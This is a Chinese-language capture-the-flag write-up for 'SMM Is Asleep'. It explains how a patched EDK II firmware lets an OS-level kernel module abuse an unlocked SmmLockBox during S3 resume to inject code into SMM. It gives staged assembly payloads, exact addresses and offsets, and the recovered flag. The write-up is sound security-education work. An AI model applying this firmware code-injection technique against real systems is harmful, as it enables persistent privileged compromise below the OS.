# SMM Is Asleep

## 题目简述

QEMU 在物理地址 `0x44440000` 映射了一页自定义 MMIO：普通模式读取只返回假 flag，只有带 secure 属性的 SMM 访问才能读到真实 flag。系统直接给 root shell并允许加载内核模块，但 EDK II 的 SMM 页表把该页标为只读禁止访问。漏洞是固件补丁移除了 `SmmLockBox` 在 EndOfDxe 后的锁定；操作系统可以在运行期保存一个 `RESTORE_IN_PLACE` LockBox，并借 S3 恢复阶段 SMRAM 尚未关闭的窗口把代码送进 SMM。

## 解题过程

### 漏洞窗口

正常的 `SmmReadyToLockEventNotify()` 会执行：

```c
mLocked = TRUE;
```

题目补丁删掉这一行，使 `SAVE`、`SET_ATTRIBUTES` 和 `UPDATE` 等 LockBox 命令在加载不可信操作系统后仍可调用。接口自身会检查目标缓冲区是否在 SMRAM 外，所以直接把数据写进 SMRAM 仍会被拒绝；真正的突破口在 S3 resume 顺序：

1. S3 唤醒后，`S3Resume2Pei` 调用 `RestoreAllLockBoxInPlace()`；
2. 此时 SMRAM 的 open/lock 状态已被 S3 重置，区域仍处于打开状态；
3. `S3Resume2Pei` 是 SMRAM 外的 PEI 代码，允许被 LockBox 原地恢复覆盖；
4. SMRAM 要到后续执行 boot script 前才会被关闭并锁定。

因此不要把恶意 boot script 当作最终入口——它执行得太晚。正确做法是让 LockBox 覆盖 `S3Resume2Pei` 自身，让被恢复的 PEI payload 在 SMRAM 仍开放时运行。

### 四阶段 payload

内核模块先从 `edk2debug.log` 使用与目标构建对应的地址：

```text
PiSmmIpl.efi:   0x0000eac6000
S3Resume2Pei:   0x00000852540
Runtime buffer: 0x000000000e8ed000
```

模块通过 `ioremap` 放置 stage 2，并向 SMM Communication Buffer 发送 `EFI_SMM_LOCK_BOX_COMMAND_SAVE`，随后把同一 GUID 的属性设为 `LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE`。覆盖点为 `S3Resume2Pei + 0x28b8`，正好位于 `InternalRestoreAllLockBoxInPlaceFromSmram()` 返回后的控制流上。

stage 2 在 PEI 上下文执行，把 stage 3 复制到 SMRAM 中 `SmmLockBoxHandler` 的入口，然后返回 `S3Resume2Pei + 0x29e0` 继续恢复流程：

```asm
payload_stage2:
  lea payload_stage3(%rip), %rsi
  mov $(0x0000ffda000 + 0x2743), %rdi
  mov $(payload_end-payload_stage3), %rcx
  rep movsb
  push $(0x00000852540 + 0x29e0)
  ret
```

直接在 64 位 long mode 清除 CR0.PG 不可行，所以 stage 3 先用已有的 selector `0x8` 切到 32 位 protected mode，再关闭分页。这样无需修改 SMM 页表，也能绕过题目为 `0x44440000` 设置的 read-protect：

```asm
payload_stage3:
  push $0x8
  lea protectedmode(%rip), %rax
  push %rax
  retfq

protectedmode: .code32
  mov $(0x80010033 - 0x80000000), %eax
  mov %eax, %cr0

  mov $0x44440000, %esi
  mov $0x3f8, %dx
print_loop:
  lodsb
  outb %al, (%dx)
  jmp print_loop
```

最后，模块调用 `pm_suspend(PM_SUSPEND_MEM)` 进入 S3。串口输入唤醒虚拟机后，LockBox 原地恢复触发 stage 2；再发送任意一次 SMI（官方解法使用 `RESTORE_ALL_IN_PLACE`）进入已被改写的 handler，stage 3/4 从 secure SMM 上下文读取 MMIO 并写到 COM1：

```text
uiuctf{this_is_why_we_cant_have_nice_things_17c079f8}
```

## 方法总结

- 核心技巧：滥用运行期可变的 SmmLockBox，在 S3 resume 的 SMRAM-open 时间窗覆盖 PEI 控制流，再由 PEI 写入 SMM handler。
- 识别信号：安全边界并不只由“地址是否在 SMRAM”决定，还取决于 S3/S4 等电源状态切换时 open、close、lock 位的恢复顺序。
- 复用要点：分析固件恢复链时必须按时间顺序标出 LockBox 恢复、SMRAM 关闭和 boot script 执行；晚于 SMRAM lock 的原语即使看似强大，也无法完成本题需要的 SMM 代码注入。
